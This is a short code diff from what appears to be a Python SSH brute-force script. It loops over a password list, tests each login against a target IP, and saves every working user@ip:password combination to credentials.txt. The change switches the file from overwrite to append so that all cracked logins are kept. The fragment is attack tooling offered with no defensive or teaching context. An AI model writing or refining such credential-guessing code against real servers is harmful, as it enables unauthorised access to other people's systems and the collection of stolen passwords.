@@ -54,5 +54,7 @@ if __name__ == "__main__":
         for password in passlist:
             if is_ssh_open(ip, user, password):
                 # if combo is valid, save it to a file
-                open("credentials.txt", "w").write(f"{user}@{ip}:{password}")
+                with open(f"credentials.txt", "a") as a_file:
+                    a_file.write("\n")
+                    a_file.write(f"{user}@{ip}:{password}")
                 break
